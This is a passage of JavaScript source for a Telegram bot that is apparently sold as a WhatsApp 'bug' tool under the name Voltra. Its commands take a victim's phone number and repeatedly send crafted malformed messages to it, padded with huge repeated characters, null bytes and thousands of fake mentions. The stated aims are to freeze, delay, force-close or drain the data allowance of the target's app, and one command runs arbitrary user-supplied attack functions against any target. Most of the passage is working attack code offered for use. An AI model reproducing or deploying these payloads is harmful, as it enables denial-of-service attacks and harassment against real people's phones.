  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(` Target ${cleanNum} Telah Berhasil Di Ewe oleh Voltra...`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 30; i++) {
    await invisibledelay(sock, target);
    await sleep(3000);
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 Luxora dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

bot.command("velix", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /velix 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐛𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Sedot Kuota
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 3; i++) {
    await sedotmemek(sock, target);
    await sedotmemek(sock, target);
    await sleep(10000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Sedot Kuota 
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("velira", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /velira 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay Invisible Beta
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 17; i++) {
    await DelayNewBetaV3(sock, target);
    await sleep(3500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay Invisible Beta
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("nerium", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /nerium 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Invisible Iphone fc
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 40; i++) {
    await Ipongforcloseivs(target);
    await sleep(5000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡l
⌑ Target: ${q}
⌑ Type: Invisible Iphone fc
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("galatea", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /galatea 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay Hard
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await DingleyX7(sock, target);
    await sleep(3000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay Hard
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 5 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 500))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote><pre>⬡═―—⊱ ⎧ BASE SCRIPT ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><pre>⬡═―—⊱ ⎧ BASE SCRIPT ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

bot.command("gamma", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /gamma 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐛𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay X Freeze
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await delayxfreeze(sock, target);
    await sleep(3000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay X Freeze
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("ralph", checkWhatsAppConnection, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /ralph 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
  if (cleanNum.length < 10) return ctx.reply("❌ Nomor salah.");

  // Proses
  const msg = await ctx.reply(` Target ${cleanNum} Telah Berhasil Di Ewe oleh Voltra...`);
  const target = cleanNum + "@s.whatsapp.net";
  
  for (let i = 0; i < 25; i++) {
    await Asixinajaaa(target);
    await Asixinajaaa(target);
    await sleep(2000);
  }
  
  await msg.editText(`✅ ${cleanNum} selesai.`);
  
 
  await ctx.telegram.sendMessage(
    ownerID,
    `📲 ralph dipakai
User: ${ctx.from.first_name}
Target: ${cleanNum}
Grup: ${ctx.chat.title || '-'}
Waktu: ${new Date().toLocaleTimeString()}`
  );
});

bot.command("wanzbau", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /wanzbau 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank X Freeze X Ui
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 4; i++) {
    await X7Blank(target);
    await sleep(4000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank X Freeze X Ui
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
// FUNCTION BUG DISINI
async function invisibledelay(sock, target) {
  try {
    let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "UNIX ♡" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "payment_key_info",
                  buttonParamsJson: "{}".repeat(2500)
                },
                {
                  name: "payment_system",
                  buttonParamsJson: "{{".repeat(2500)
                }
              ]
            }
          }
        }
      }
    }, {});
    
    let heavy = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\u0000".repeat(400),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"H\",\"address\":\"XT\",\"tower_number\":\"XTX\",\"city\":\"Padang\",\"name\":\"Sumatera Barat\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
            },
            contextInfo: {
              mentionedJid: [
                   "0@s.whatsapp.net",
                      ...Array.from(
                      { length: 1900 },
                      () => 
                      "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                       )
                   ],
                   forwardingScore: 778,
                   isForwarded: true,
                   stanzaId: "ABCDEFG123456789",
                   quotedMessage: {
                     paymentIviteMessage: {
                       serviceType: 3,
                       expiryTimestamp: Date.now() + 1814400000
                     }
                   }
                }
              }
            }
          }
      }, {});
      
      await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: msg.message
          }
          },
          {
            participant: { jid: target },
            messegeId: msg.key.id
            });
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: heavy.message
          }
          },
          {
            participant: { jid: target },
            messegeId: heavy.key.id
     });
  } catch (err) {
    console.log(err.message)
  }
  console.log(chalk.red.bold("[+] CREDITS FUNC BY: BERAS JAYA TEAM"));
}

async function Ipongforcloseivs(target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/elyssavirellequeenn",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "helow",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + TravaIphone, 
            matchedText: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 10; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function X7Force(sock, target) {
  try {
    const generateId = () => Math.random().toString(36).substring(2, 15);
    const msg = {
      key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mimetype: "image/jpeg",
          fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
          caption: "𝖷𝟩 𝖡𝗒: 𝖠𝗌𝖾𝗉",
          fileLength: "149502",
          height: 1397,
          width: 1126,
          mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
          fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
